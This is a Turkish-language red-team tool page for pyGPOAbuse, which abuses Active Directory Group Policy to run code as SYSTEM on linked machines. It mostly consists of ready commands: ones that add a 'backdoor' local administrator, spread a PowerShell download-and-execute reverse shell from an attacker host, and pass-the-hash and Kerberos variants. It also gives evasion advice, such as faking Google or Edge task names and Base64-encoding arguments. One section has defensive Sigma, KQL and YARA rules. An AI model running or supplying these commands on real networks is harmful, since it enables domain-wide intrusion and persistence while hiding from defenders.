# pyGPOAbuse

> **Kategori:** [9. ACL, GPO ve Nesne Manipülasyonu](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Charlie Bromberg (@ShutdownRepo) tarafından geliştirilen; Linux işletim sisteminden Python 3 ve Impacket/ldap3 kütüphaneleriyle çalışan, saldırganın düzenleme yetkisine (`GenericAll`, `GenericWrite`, `WriteProperty`) sahip olduğu bir Grup İlkesi Nesnesini (GPO) hedef alarak SYSVOL paylaşımına anlık zamanlanmış görev (`ScheduledTasks.xml`) enjekte eden ve bağlı tüm makinelerde `SYSTEM` yetkisiyle kod yürüten sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında Grup İlkesi Nesneleri (GPO), merkezi yönetim sağladığı kadar yetki yükseltme ve yanal hareket için de en güçlü saldırı yüzeylerinden biridir. Windows tarafında çalışan `SharpGPOAbuse` aracı sömürü yeteneklerini kanıtlamış olsa da, saldırılarını Linux dağıtımları (Kali, Parrot, Debian) veya uzak C2 pivot sunucuları üzerinden yürüten operatörlerin Windows ortamına bağımlı olmadan saf Python ile çalışan araçlara ihtiyacı vardır.

**`pyGPOAbuse`**, bu ihtiyacı karşılamak üzere geliştirilmiş, platformdan bağımsız bir GPO exploit motorudur. `Impacket` ve `ldap3` kütüphanelerini kullanarak hem Active Directory LDAP dizin hizmetini (GPC - Group Policy Container) hem de etki alanı denetleyicisinin SYSVOL dosya paylaşımını (GPT - Group Policy Template) Linux terminalinden doğrudan manipüle eder.

### Temel Çalışma Mekanizması

1. **GPO ve İzin Analizi:** Saldırganın hedeflediği GPO'nun adı (`-gpo-name`) veya GUID değeri (`-gpo-id`) LDAP üzerinden sorgulanır. Kullanıcının GPC nesnesi ve SYSVOL üzerindeki izinleri doğrulanır.
2. **SYSVOL Üzerinde XML Enjeksiyonu:**
   - Impacket `SMBConnection` motoru kullanılarak Domain Controller'ın `SYSVOL` paylaşımına (TCP 445) bağlanılır.
   - İlgili GPO klasörü altında `Machine\Preferences\ScheduledTasks\` dizin yapısı oluşturulur.
   - Bu dizine özel olarak inşa edilmiş bir `ScheduledTasks.xml` dosyası yazılır. Bu XML, ilke işlendiği saniyede hiçbir gecikme olmadan doğrudan çalışacak bir **Anlık Görev (Immediate Task)** tanımlar. Görev, yerel **`NT AUTHORITY\SYSTEM`** hesabı bağlamında çalışacak şekilde yapılandırılır.
3. **Versiyon Numaralarının Eşitlenmesi:**
   - SYSVOL içindeki `gpt.ini` dosyasında Makine sürüm numarası (`Version = MachineVersion + 1`) artırılır.
   - LDAP üzerinden DC'deki GPC nesnesine bağlanılır; `versionNumber` özniteliği `gpt.ini` ile eşitlenir.
4. **İstemci Tarafı Uzantısı (CSE) Enjeksiyonu:**
   - İstemci makinelerin XML dosyasını doğru şekilde ayrıştırmasını sağlamak için GPC nesnesinin `gPCMachineExtensionNames` özniteliğine Zamanlanmış Görevler CSE GUID değerleri (`[{CAB54552-DE03-11D1-AC36-00C04FB873F9}{AADCED64-746C-4633-AC5C-014261637D42}]`) eklenir.
5. **İlke Yenilemesi ve Otomatik Kod Yürütme:**
   - GPO'nun bağlı olduğu OU'daki bilgisayarlar ilke yenileme periyodunda yeni sürümü fark eder, XML görevini çeker ve `SYSTEM` yetkileriyle saldırganın komutunu yürütür.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN LINUX PLATFORMU (PYGPOABUSE)               │
│                                                                        │
│  [ python3 pygpoabuse.py corp.local/jdoe:Pass123@10.10.10.1            │
│                         -gpo-name "Workstation-Policy"                 │
│                         -command "cmd.exe" -args "/c net user..." ]    │
│         │                                                              │
│         ├── (1) LDAP / LDAPS Sorgusu (TCP 389/636):                    │
│         │   └── GPO Nesnesi Bulunur: CN={GUID},CN=Policies,...         │
│         │                                                              │
│         ├── (2) SMB Bağlantısı (TCP 445): \\10.10.10.1\SYSVOL\         │
│         │   └── ScheduledTasks.xml Yazılır (SYSTEM Yetkili Anlık Görev)│
│         │   └── gpt.ini Güncellenir (Version = Version + 1)            │
│         │                                                              │
│         ├── (3) LDAP Modify Çağrısı:                                   │
│         │   └── versionNumber Güncellenir                              │
│         │   └── gPCMachineExtensionNames Alanına CSE GUID'leri Eklenir │
│         │                                                              │
│         ▼                                                              │
│  [ DOMAIN CONTROLLER (SYSVOL & LDAP GÜNCELLENDİ) ]                     │
│         │                                                              │
│         │ (Periyodik 90dk İlke Yenileme veya Zorlamalı gpupdate)       │
│         ▼                                                              │
│  [ HEDEF SUNUCULAR / İŞ İSTASYONLARI (OU İÇİNDEKİ TÜM BİLGİSAYARLAR) ] │
│         │                                                              │
│         ├── GPO Güncellemesini Algılar ve SYSVOL'den XML'i İndirir     │
│         └── Görevi Derhal Yürütür: NT AUTHORITY\SYSTEM                 │
│                   │                                                    │
│                   ▼                                                    │
│  [ ÇIKTI: Tüm Bilgisayarlarda SYSTEM Haklarıyla Kod Yürütüldü! ]      │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Windows Araçları (SharpGPOAbuse) | Linux Tabanlı pyGPOAbuse |
|---|---|---|
| **Saldırı Ortamı** | Windows kurban makinesi veya Cobalt Strike gerekir. | Linux saldırı makinesinden doğrudan çalıştırılır. |
| **Pass-the-Hash Desteği** | Windows oturumu veya mimikatz token'ı gerekir. | `-hashes :NT_HASH` bayrağı ile Pass-the-Hash doğrudan desteklenir. |
| **Ağ Portları Gereksinimi**| Uç noktaya bağlanamazsa işlem başarısız olur. | Yalnızca Domain Controller'a (445 ve 389) bağlanmak yeterlidir. |
| **Kerberos Desteği** | Windows SSPI kullanılır. | Linux standart Kerberos biletleri (`.ccache`) ile `-k` üzerinden çalışır. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | pyGPOAbuse | SharpGPOAbuse | bloodyAD | StandIn |
|---|---|---|---|---|
| **Geliştirme Dili** | Python 3 | C# (.NET) | Python 3 | C# (.NET) |
| **Kullanım Amacı** | GPO Şablon & Görev Sömürüsü | GPO Şablon & Görev Sömürüsü | Kapsamlı LDAP Nesne Sömürüsü | C# AD Nesne Manipülasyonu |
| **Immediate Task Enjeksiyonu**| 🟢 Tam Otomatik XML | 🟢 Tam Otomatik XML | 🔴 Desteklemez | 🔴 Kısıtlı |
| **Pass-the-Hash Desteği** | 🟢 Yerleşik (`-hashes`) | 🔴 Yok | 🟢 Yerleşik (`--hashes`)| 🔴 Yok |
| **Kerberos Bilet Desteği** | 🟢 Var (`-k`) | 🟢 Var (Yerel Token) | 🟢 Var (`-k`) | 🟢 Var |
| **SYSVOL SMB Motoru** | Impacket SMB | Windows Native SMB | Desteklemez (Salt LDAP) | Windows Native SMB |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

pyGPOAbuse, etki alanı kimlik bilgileri, hedef GPO tanımlayıcıları ve çalıştırılacak komut argümanları ile çalışır.

### Genel Sözdizimi

```bash
python3 pygpoabuse.py <DOMAIN>/<KULLANICI>:<PAROLA>@<DC_IP> [Seçenekler]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `-gpo-name AD` | Düzenlenecek hedef GPO'nun Görünen Adı (Display Name). | `-gpo-name "Default Domain Policy"` |
| `-gpo-id GUID` | Hedef GPO'nun benzersiz GUID değeri. | `-gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}"` |
| `-command KOMUT` | Hedef bilgisayarlarda çalıştırılacak ikili program (Varsayılan: `cmd.exe`). | `-command "powershell.exe"` |
| `-args ARGÜMANLAR` | Çalıştırılacak programa iletilecek komut satırı argümanları. | `-args "-c net user /add ..."` |
| `-taskname AD` | Oluşturulacak zamanlanmış görevin adı (Varsayılan: `UpdateTask`). | `-taskname "MicrosoftEdgeUpdate"` |
| `-author YAZAR` | Görev meta verisindeki yazar adı (Varsayılan: `NT AUTHORITY\SYSTEM`). | `-author "NT AUTHORITY\SYSTEM"` |
| `-hashes LM:NT` | Parola yerine NTLM parola karması ile Pass-the-Hash kimlik doğrulaması. | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-k` | Parola yerine mevcut Kerberos bilet önbelleğini (`KRB5CCNAME`) kullanır. | `-k -no-pass` |
| `-no-pass` | Parola sorma işlemini atlar (Kerberos veya hash ile kullanılır). | `-no-pass` |
| `-dc-ip IP` | Hedef Etki Alanı Denetleyicisinin IP adresi. | `-dc-ip 10.10.10.1` |
| `-ssl` | LDAP işlemlerini SSL/TLS (LDAPS Port 636) üzerinden yürütür. | `-ssl` |
| `-force` | Mevcut görev dosyalarının üzerine zorla yazılmasını sağlar. | `-force` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: GPO Adı ile Anlık Görev Enjekte Etme (Immediate Task)

Hedef etki alanında düzenleme yetkisine sahip olunan `Staff-Workstations` GPO'suna anında çalışacak bir yerel yönetici oluşturma komutu enjekte etmek:

```bash
python3 pygpoabuse.py 'corp.local/jdoe:Welcome2026!@10.10.10.1' -gpo-name "Staff-Workstations" -command "cmd.exe" -args "/c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" -taskname "SystemMaintenance"
```

**Örnek Konsol Çıktısı Analizi:**

```text
[+] pyGPOAbuse by Charlie Bromberg (@ShutdownRepo)
[*] Connecting to LDAP server 10.10.10.1:389...
[+] Successfully bound to LDAP as 'jdoe@corp.local'!
[*] Searching for GPO named 'Staff-Workstations'...
[+] Found GPO: CN={4A8912A0-912F-4310-9281-72BA01928471},CN=Policies,CN=System,DC=corp,DC=local
[*] GPO GUID: {4A8912A0-912F-4310-9281-72BA01928471}
[*] Current version: 24

[*] Connecting to SYSVOL share on 10.10.10.1:445...
[+] Connected to \\10.10.10.1\SYSVOL!
[*] Checking permissions on \\10.10.10.1\SYSVOL\corp.local\Policies\{4A8912A0-912F-4310-9281-72BA01928471}...
[+] Write permissions confirmed!

[*] Creating ScheduledTasks.xml for immediate execution (SYSTEM)...
[+] ScheduledTasks.xml successfully written to SYSVOL!

[*] Incrementing version in gpt.ini...
[+] New version in gpt.ini: 25

[*] Updating GPC object in LDAP...
[*] Setting versionNumber to 25...
[*] Updating gPCMachineExtensionNames with Scheduled Tasks CSE...
[+] GPC LDAP object successfully updated!

[+] GPO abuse completed successfully!
[*] All computers linked to 'Staff-Workstations' will execute the task as SYSTEM upon their next policy refresh.
```

*Çıktı Yorumu:* pyGPOAbuse, hem SYSVOL dosyasını hem de LDAP nesnesini güncelleyerek sürümü 24'ten 25'e çıkarmıştır. İlkeyi çeken tüm makineler arka planda `backdoor` kullanıcısını oluşturacaktır.

### Senaryo 2: Pass-the-Hash ile GPO Sömürüsü

Açık parola bulunmadığında yalnızca elde edilen NTLM hash ile Linux makinesinden GPO sömürüsünü yürütmek:

```bash
python3 pygpoabuse.py 'corp.local/admin_user@10.10.10.1' -hashes :7a1029384bfe2109384729102834bfa1 -gpo-name "Workstations-Policy" -command "cmd.exe" -args "/c whoami > C:\pwned.txt"
```

### Senaryo 3: GPO Üzerinden Tersine Kabuk (Reverse Shell) Yayma

Bağlı tüm bilgisayarlardan saldırgan makinesine `SYSTEM` yetkileriyle PowerShell tersine kabuk bağlantısı açtırmak:

```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-name "Servers-Policy" -command "powershell.exe" -args "-nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/rev.ps1')\"" -taskname "CloudSyncCheck"
```

### Senaryo 4: GPO GUID Değeri Belirterek Doğrudan Sömürü

GPO adı özel karakterler veya boşluklar içerdiğinde doğrudan benzersiz GUID kimliği ile hedefleme:

```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -command "cmd.exe" -args "/c powershell.exe -enc <Base64Payload>"
```

### Senaryo 5: Kerberos Bilet Önbelleği (.ccache) ile Parolasız Çalıştırma

Önceden elde edilmiş bir Kerberos TGT bileti kullanarak parola veya hash girmeden GPO'yu manipüle etmek:

```bash
export KRB5CCNAME=/tmp/admin.ccache
python3 pygpoabuse.py 'corp.local/admin_user@dc01.corp.local' -k -no-pass -gpo-name "Default Workstations" -command "calc.exe"
```

### Senaryo 6: Şifreli LDAPS Bağlantısı ile Çalıştırma

Düz metin LDAP dinlemesinden kaçınmak ve güvenlik sıkılaştırmalarını aşmak için TLS şifreli LDAPS kullanmak:

```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@dc01.corp.local' -ssl -gpo-name "Corp-Laptops" -command "cmd.exe" -args "/c net user"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `SessionError: STATUS_ACCESS_DENIED on SMB write` | Kullanıcının Active Directory LDAP üzerindeki GPC nesnesinde yazma hakkı vardır ancak Domain Controller'ın SYSVOL paylaşımındaki NTFS izinlerinde yazma yetkisi bulunmamaktadır. | GPC ve GPT izinleri birbirinden bağımsızdır. Kullanıcının SYSVOL paylaşımındaki dosya yazma hakları denetlenmeli; eğer dosya yazılamıyorsa GPO sömürüsü uygulanamaz. |
| `LDAPInsufficientAccessRightsResult: 0x32 (INSUFFICIENT_ACCESS_RIGHTS)` | Kullanıcının LDAP üzerindeki GPC nesnesinde `versionNumber` veya `gPCMachineExtensionNames` özniteliklerini düzenleme izni yoktur. | BloodHound üzerindeki izinler tekrar kontrol edilmeli; `WriteProperty` veya `GenericWrite` izni bulunan doğru GPO nesnesi seçilmelidir. |
| `Connection timed out on port 445` | Saldırgan Linux makinesi ile Domain Controller arasındaki SMB (TCP 445) trafiği ağ güvenlik duvarı tarafından engellenmektedir. | Ağ erişimi kontrol edilmeli; doğrudan SMB erişimi yoksa iç ağdaki bir pivot makinesi üzerinden tünelleme (Chisel/Socks5) kurulmalıdır. |
| `KerberosSessionError: KRB_AP_ERR_SKEW (Clock skew too great)` | Linux saldırgan makinesinin saati ile hedef Domain Controller'ın saati arasında 5 dakikadan fazla fark vardır. | Saat senkronize edilmelidir: `sudo ntpdate 10.10.10.1` veya `sudo rdate -n 10.10.10.1`. |
| `Clients do not execute task / Policy ignored` | `gpt.ini` içindeki sürüm numarası ile LDAP `versionNumber` değeri uyuşmamıştır ya da sürüm artırılmamıştır. | `-force` bayrağı ile komut tekrar çalıştırılmalı ve sürüm numarasının hem SYSVOL hem de LDAP üzerinde arttığı doğrulanmalıdır. |
| `UnicodeDecodeError in GPO name` | GPO'nun Görünen Adında Türkçe veya özel karakterler bulunmaktadır. | `-gpo-name` yerine doğrudan `-gpo-id "{GUID}"` bayrağı kullanılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟡 ORTA (SMB TCP 445 + LDAP TCP 389/636)        │
│  [ SYSVOL Dosya İzi ]: 🔴 YÜKSEK (Event 5145 Dosya Yazma Olayı)        │
│  [ Dizin Günlüğü ]   : 🔴 YÜKSEK (Event 5136 GPC Nesne Modifikasyonu) │
│  [ Uç Nokta İzi ]    : 🔴 YÜKSEK (Event 4698 Zamanlanmış Görev İcadı)  │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dosya Paylaşım Günlükleri (Security Log):**
   - **Event ID 5145 (A network share object was accessed):**
     - `ShareName: \\*\SYSVOL`
     - `RelativeTargetName: ...\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`
     - `AccessMask: 0x2 (WriteData)`
     - Standart bir kullanıcının SYSVOL altına XML yazması yüksek öncelikli bir SIEM alarmıdır.
2. **Domain Controller Dizin Değişiklik Günlükleri:**
   - **Event ID 5136 (Directory Service Object Modified):**
     - GPC nesnesinde `AttributeLDAPDisplayName: versionNumber` ve `gPCMachineExtensionNames` değerlerinin değiştirilmesi.
3. **Uç Nokta Olay Günlükleri (Tüm İstemcilerde):**
   - **Event ID 4698 (A scheduled task was created):** `TaskName` alanında `SystemMaintenance` veya belirlenen isim görünür.
   - **Sysmon Event ID 1 (Process Create):** `svchost.exe` veya `taskeng.exe` tarafından başlatılan alt süreçler (`cmd.exe`, `powershell.exe`).

### 5.2 Ağ ve EDR İmzaları

- **İstemci Parmak İzi:** Linux `Impacket` SMB ve `ldap3` kütüphanelerinin ağ paket başlıkları standart Windows istemcilerinden farklılık gösterir.
- **Toplu İstek Anomalisi:** İlke yenilenmesiyle birlikte etki alanındaki yüzlerce bilgisayarın aynı saniyede SYSVOL'den `ScheduledTasks.xml` dosyasını çekmesi ağda belirgin bir trafik dalgalanması oluşturur.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1484.001** | Domain Policy Modification: Group Policy Modification | GPO şablonlarının ve dizin nesnelerinin manipüle edilmesi. |
| **T1053.005** | Scheduled Task/Job: Scheduled Task | İstemcilerde SYSTEM yetkili zamanlanmış görev oluşturulması. |
| **T1078.002** | Valid Accounts: Domain Accounts | Meşru kullanıcı haklarıyla etki alanında yetki yükseltilmesi. |
| **T1098** | Account Manipulation | Yerel yönetici gruplarına kullanıcı eklenmesi veya arka kapı oluşturulması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Geniş Kapsamlı GPO Tehlikesi** | `Default Domain Policy` gibi tüm domaini kapsayan GPO'ları hedeflemeyin; binlerce makinede aynı anda alarm patlaması yaşanır. Küçük bir sunucu OU'sunu hedefleyin. |
| **Görev Adı ve Meta Verisi** | `-taskname` bayrağına `OneDrive Sync Task` veya `EdgeUpdateTask` gibi meşru sistem isimleri verin. |
| **SYSVOL Dosya Temizliği** | Sızma testi tamamlandığında SYSVOL altındaki `ScheduledTasks.xml` dosyası silinmeli ve ilke versiyonu orijinal haline döndürülmelidir. |
| **Komut Satırı Gizleme** | Komut argümanlarında doğrudan `net user` gibi bilinen dizgiler yerine kodlanmış (Base64) veya meşru LOLBin çağrıları kullanın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Linux/Python Tabanlı SYSVOL GPO Manipülasyon Tespiti

```yaml
title: Python/Impacket GPO Scheduled Task Write to SYSVOL
id: e91248a1-3912-4c20-a912-48910245fe01
status: experimental
description: Detects SMB write operations to ScheduledTasks.xml in SYSVOL share, characteristic of pyGPOAbuse.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName|endswith: '\SYSVOL'
    RelativeTargetName|contains: 'ScheduledTasks\ScheduledTasks.xml'
    AccessMask: '0x2'
  condition: selection
falsepositives:
  - Legitimate GPO management by Domain Administrators via GPMC
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1484.001
```

#### Microsoft Sentinel KQL Sorgusu: Şüpheli SYSVOL ScheduledTasks.xml Yazma Olayları

```kql
// Standart veya yetkisiz hesaplar tarafından SYSVOL altına ScheduledTasks.xml yazılması
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 5145 and ShareName has "SYSVOL"
| where RelativeTargetName has @"Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
| where AccessMask in ("0x2", "0x12019f", "0x100")
| project TimeGenerated, Computer, SubjectUserName, RelativeTargetName, IpAddress
```

#### YARA Kuralı: pyGPOAbuse Python Betiği ve İmzaları

```yara
rule PostExploit_pyGPOAbuse_Script {
    meta:
        description = "Detects pyGPOAbuse Python GPO exploitation tool"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "pyGPOAbuse" ascii
        $s2 = "ScheduledTasks.xml" ascii
        $s3 = "gPCMachineExtensionNames" ascii
        $s4 = "CAB54552-DE03-11D1-AC36-00C04FB873F9" ascii
        $s5 = "impacket.smbconnection" ascii
    condition:
        all of ($s1, $s2, $s3) or (3 of ($s2, $s3, $s4, $s5))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: GPO Adı ile SYSTEM Yetkili Anlık Görev Enjeksiyonu
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-name "Workstation-Policy" -command "cmd.exe" -args "/c net user backdoor Pass123! /add && net localgroup administrators backdoor /add"
```
- **Ne Yapar?** Belirtilen GPO'ya anlık zamanlanmış görev enjekte eder; ilkeyi çeken makinelerde yerel yönetici oluşturur.
- **Ne Zaman Kullanılır?** GPO düzenleme hakkı olan standart kullanıcı ile toplu yerel yönetici olmak için.
- **Parametreler:** `-gpo-name`: GPO adı, `-command`: Yürütülecek ikili, `-args`: Komut argümanları.

### Komut 2: Pass-the-Hash ile GPO Sömürüsü
```bash
python3 pygpoabuse.py 'corp.local/admin_user@10.10.10.1' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -gpo-name "Laptops-Policy" -command "powershell.exe" -args "-c whoami > C:\pwn.txt"
```
- **Ne Yapar?** Parola bilmeden doğrudan NTLM hash'i ile kimlik doğrulayıp GPO görevini enjekte eder.
- **Ne Zaman Kullanılır?** Yalnızca parola karması ele geçirildiğinde.
- **Parametreler:** `-hashes`: LM:NT parola karması formatı.

### Komut 3: GPO GUID ile Doğrudan Hedefleme
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -command "cmd.exe" -args "/c whoami"
```
- **Ne Yapar?** GPO adını aramadan doğrudan bilinen GUID değeri üzerinden enjeksiyon yapar.
- **Ne Zaman Kullanılır?** GPO adı karmaşık karakterler içerdiğinde veya doğrudan GUID bilindiğinde.
- **Parametreler:** `-gpo-id`: Hedef GPO GUID değeri.

### Komut 4: Meşru Görev Adı ile OPSEC Gizlemesi
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-name "Workstation-Policy" -command "cmd.exe" -args "/c whoami" -taskname "GoogleUpdateTaskMachineQC" -author "Google LLC"
```
- **Ne Yapar?** Oluşturulan zamanlanmış görevin adını ve yazarını meşru bir yazılım gibi gösterir.
- **Ne Zaman Kullanılır?** Görev Yöneticisi veya Olay Günlüklerinde şüphe uyandırmamak için.
- **Parametreler:** `-taskname`: Görev adı, `-author`: Yazar meta verisi.

### Komut 5: Tersine Kabuk (Reverse Shell) Yayma
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-name "Servers-Policy" -command "powershell.exe" -args "-nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/rev.ps1')\""
```
- **Ne Yapar?** GPO'nun uygulandığı tüm sunuculardan saldırgan makinesine tersine kabuk başlatır.
- **Ne Zaman Kullanılır?** Toplu C2 ajanı veya Beacon yaymak için.
- **Parametreler:** `-command powershell.exe`: Web üzerinden yük indirip hafızada çalıştırır.

### Komut 6: Kerberos Bileti ile Parolasız Çalıştırma
```bash
export KRB5CCNAME=admin.ccache && python3 pygpoabuse.py 'corp.local/admin@dc01.corp.local' -k -no-pass -gpo-name "Workstations-Policy" -command "calc.exe"
```
- **Ne Yapar?** Parola sormadan Kerberos bilet önbelleğini kullanarak GPO'yu manipüle eder.
- **Ne Zaman Kullanılır?** TGT bileti mevcut olduğunda parola izi bırakmamak için.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 7: Şifreli LDAPS Bağlantısı Zorlama
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@dc01.corp.local' -ssl -gpo-name "Corp-Laptops" -command "cmd.exe" -args "/c whoami"
```
- **Ne Yapar?** LDAP işlemlerini Port 636 üzerinden TLS şifreli olarak yürütür.
- **Ne Zaman Kullanılır?** LDAP imzalama zorunluluğunu aşmak ve ağ dinlemesini engellemek için.
- **Parametreler:** `-ssl`: Güvenli soket bağlantısı.

### Komut 8: Mevcut Görevin Üzerine Zorla Yazma
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -force -gpo-name "Workstations-Policy" -command "cmd.exe" -args "/c whoami"
```
- **Ne Yapar?** Önceden oluşturulmuş bir görev varsa üzerine yazar ve ilke sürümünü artırır.
- **Ne Zaman Kullanılır?** Yükü güncellemek veya hata durumunda görevi yenilemek için.
- **Parametreler:** `-force`: Üzerine yazmayı zorlar.

### Komut 9: Belirli Bir Domain Controller IP'si Tanımlama
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.2' -dc-ip 10.10.10.2 -gpo-name "Branch-Policy" -command "cmd.exe" -args "/c whoami"
```
- **Ne Yapar?** SMB ve LDAP operasyonlarını doğrudan belirtilen DC IP'sine yönlendirir.
- **Ne Zaman Kullanılır?** DNS çözümlemesi çalışmadığında veya doğrudan ikincil DC hedeflendiğinde.
- **Parametreler:** `-dc-ip`: Hedef etki alanı denetleyicisi IP'si.

### Komut 10: Komut Yürütme Başarısını Dosyaya Yazdırarak Doğrulama
```bash
python3 pygpoabuse.py 'corp.local/jdoe:Pass123!@10.10.10.1' -gpo-name "Workstations-Policy" -command "cmd.exe" -args "/c hostname > C:\\Windows\\Temp\\pwned.txt"
```
- **Ne Yapar?** Hedef bilgisayarlarda yerel bir metin dosyasına hostname yazarak görevin çalıştığını doğrular.
- **Ne Zaman Kullanılır?** Ağ trafiği yaratmadan görevin başarıyla işlendiğini test etmek için.
- **Parametreler:** Çıktıyı yerel Temp dizinine yönlendirme.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [ShutdownRepo / pyGPOAbuse](https://github.com/ShutdownRepo/pyGPOAbuse)
- **F-Secure LABS SharpGPOAbuse:** [F-Secure LABS Research](https://github.com/FSecureLABS/SharpGPOAbuse)
- **SpecterOps GPO Araştırması:** [Abusing Group Policy Objects](https://posts.specterops.io/)
- **MITRE ATT&CK Referansı:** [T1484.001 - Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/)

---

> **Önceki:** [← SharpGPOAbuse](./SharpGPOAbuse.md) · **Sonraki:** [PowerMad →](./PowerMad.md)
